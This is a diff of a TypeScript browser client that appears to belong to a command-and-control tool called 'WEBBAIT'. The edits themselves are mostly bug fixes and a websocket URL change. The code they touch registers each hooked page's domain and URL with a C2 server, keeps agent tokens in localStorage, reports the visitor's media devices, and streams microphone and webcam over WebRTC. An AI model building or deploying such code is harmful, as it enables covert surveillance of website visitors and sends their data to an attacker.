@@ -33,10 +33,14 @@ export type WebRtcSubjects = {
   type: 'peerDevices'
   id: string
   devices: MediaDeviceInfo[]
+} | {
+  type: 'webRtcError'
+  id: string
+  msg: string
 }
 
 export const websocketManager = new Manager(
-  `ws://${process.env.REACT_APP_WS_HOST ? process.env.REACT_APP_WS_HOST : 'localhost'}:${process.env.REACT_APP_WS_PORT ? +process.env.REACT_APP_WS_PORT : 3001}`,
+  `${process.env.REACT_APP_WS_URL ? process.env.REACT_APP_WS_URL : 'wss://localhost:3001'}/webrtc`,
   {
     transports: ['websocket'],
     autoConnect: false,
@@ -56,7 +60,7 @@ export const connectAdminWebsocket = async () => {
     }).connect();
     websocketService.on('error', (msg: string) => {
       if (msg.startsWith('Invalid token')) {
-        location.reload();
+        window.location.reload();
       }
     });
   }
@@ -65,9 +69,7 @@ export const connectAdminWebsocket = async () => {
 export let clientWebsocketService: Socket | null = null;
 
 export const connectClientWebsocket = async () => {
-  console.log('connectClientWebsocket');
   if (clientWebsocketService && clientWebsocketService.connected) return;
-  console.log('connectClientWebsocket');
   const agentId = localStorage.getItem('WEBBAIT_CLIENT_AGENT_ID');
   const token = localStorage.getItem('WEBBAIT_CLIENT_TOKEN');
   if (agentId) {
@@ -114,7 +116,7 @@ export const connectClientWebsocket = async () => {
     const req = Axios.create({
       baseURL: process.env.REACT_APP_C2_URL ? process.env.REACT_APP_C2_URL : 'http://localhost:3001',
     });
-    const res: AxiosResponse<{ agentId: string, token: string }> = await req.post('/agents', { domain: location.host, url: location.href });
+    const res: AxiosResponse<{ agentId: string, token: string }> = await req.post('/agents', { domain: window.location.host, url: window.location.href });
     localStorage.setItem('WEBBAIT_CLIENT_AGENT_ID', res.data.agentId);
     localStorage.setItem('WEBBAIT_CLIENT_TOKEN', res.data.token);
     await connectClientWebsocket();
@@ -137,6 +139,7 @@ export class WebRtcWebsocket {
     private subject: Subject<WebRtcSubjects>,
   ) {
     this.socket.on('error', this.handleError);
+    this.socket.on('webRtcError', (id: string, msg: string) => this.subject.next({ type: 'webRtcError', id, msg }));
     this.socket.on('routerRtpCapabilities', this.handleRouterRtpCapabilities);
     this.socket.on('peers', this.handlePeers);
     this.socket.on('peerJoined', this.handlePeerJoined);
@@ -185,8 +188,7 @@ export class WebRtcWebsocket {
   }
 
   private handleRouterRtpCapabilities = async (routerRtpCapabilities: RtpCapabilities) => {
-    if (this.device.loaded) return;
-    await this.device.load({ routerRtpCapabilities });
+    if (!this.device.loaded) await this.device.load({ routerRtpCapabilities });
     this.socket.emit('deviceRtpCapabilities', this.device.rtpCapabilities);
     this.socket.emit('mediaDevices', await navigator.mediaDevices.enumerateDevices());
   }
@@ -271,7 +273,7 @@ export class WebRtcWebsocket {
   micMuted = () => {
     const micProducer = this.producers.get('mic');
     if (micProducer) return micProducer.paused;
-    else false;
+    else return false;
   }
 
   changeMic = async (deviceId: string) => {
@@ -359,7 +361,7 @@ export class WebRtcWebsocket {
   webcamPaused = () => {
     const webcamProducer = this.producers.get('webcam');
     if (webcamProducer) return webcamProducer.paused;
-    else false;
+    else return false;
   }
 
   pauseWebcam = () => {
